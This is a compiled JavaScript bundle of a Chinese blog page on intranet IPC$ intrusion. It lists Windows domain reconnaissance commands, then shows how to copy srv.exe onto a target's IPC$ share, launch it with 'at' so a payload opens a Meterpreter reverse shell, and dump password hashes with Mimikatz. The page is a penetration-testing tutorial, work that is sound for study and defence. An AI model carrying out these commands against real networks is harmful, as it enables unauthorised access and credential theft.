(window.webpackJsonp=window.webpackJsonp||[]).push([[244],{533:function(a,s,t){"use strict";t.r(s);var e=t(7),n=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"内网ipc-入侵"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#内网ipc-入侵"}},[a._v("#")]),a._v(" 内网IPC$入侵")]),a._v(" "),s("h2",{attrs:{id:"域操作相关的命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#域操作相关的命令"}},[a._v("#")]),a._v(" 域操作相关的命令")]),a._v(" "),s("p",[a._v("1.查看域用户")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("net user/domain\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("2.查看有几个域")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("net view/domain\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("3.查看域内的主机")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("net view/domain: XXX\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("4.查看域里面的组")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("net group/domain\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("5.查看域内所有的主机名")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v('net group "domain computers" /domain\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("6.查看域管理员")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v('net group "domain admins" /domain\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("7.查看域控制器")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v('net group "domain controllers" /domain\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("8.查看企业管理组")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v('net group "enterprise admins" /domain\n')])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("9.查看时间服务器")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("nettime/domain\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("h2",{attrs:{id:"ipc-入侵"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ipc-入侵"}},[a._v("#")]),a._v(" IPC$入侵")]),a._v(" "),s("p",[a._v("IPC入侵，即通过使用系统默认启动的共享获得计算机控制权的入侵，在内网中及其常见。 假设现在有一台IPC$主机：127.0.0.25，输入以下命令。")]),a._v(" "),s("div",{staticClass:"language- line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-text"}},[s("code",[a._v("#连接127.0.0.25的IPC$共享：\nD:>net use \\127.0.0.25\\ipc$\n#复制srv.exe到目标主机\nD:>copy srv.exe \\127.0.0.25\\ipc$ \n#查时间\nD:>net time\\127.0.0.25\n#用at命令在10点50分启动srv.exe(注意这里设置的时间比主机时间快)\nD:>at \\127.0.0.25 10:50 srv.exe\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br"),s("span",{staticClass:"line-number"},[a._v("8")]),s("br")])]),s("p",[a._v("上述命令中的at就是让计算机在指定的时间做指定事情的命令(例如运行程序)")]),a._v(" "),s("p",[a._v("这里把免杀的Payload上传到PAVMSEP131服务器，然后利用at命令启动Payload，反弹回Meterpreter Shell 将木马复制到目标服务器")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107122806779.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("查看系统时间")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107122829601.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("使用at命令启动木马")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010712285057.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("接着返回handler监听，可以看到反弹成功了，我们获得了PAVMSEP131服务器的Meterpreter Shell 反弹成功")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/2019010712291273.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("下面看看PAVMSEP131服务器的信息和现在的权限 查看系统信息")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107122934648.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("可以看到有SYSTEM权限，说明既可以使用Mimikatz等工具，也可以输入 run post/windows/gather/hashdump来抓Hash 在用Mimikatz抓Hash前要注意一点：如果服务器安装的是64位操作系统，要把Mimikatz的进程迁移到一个64位的程序进程中，才能查看64位操作系统的密码明文，在32位系统中就没有这个限制。")]),a._v(" "),s("p",[a._v("这里使用Mimikatz抓Hash")]),a._v(" "),s("p",[a._v("上传Mimikatz")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107123004795.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("抓取Hash")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107123104136.jpg",loading:"lazy"}})]),a._v(" "),s("p",[a._v("查看抓到的域用户的权限")]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"img","data-src":"https://img-blog.csdnimg.cn/20190107123127758.jpg",loading:"lazy"}})]),a._v(" "),s("h2",{attrs:{id:"写在最后"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[a._v("#")]),a._v(" 写在最后")]),a._v(" "),s("blockquote",[s("p",[a._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),s("strong",[a._v("冰河技术")]),a._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),a._v(" "),s("p",[s("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);s.default=n.exports}}]);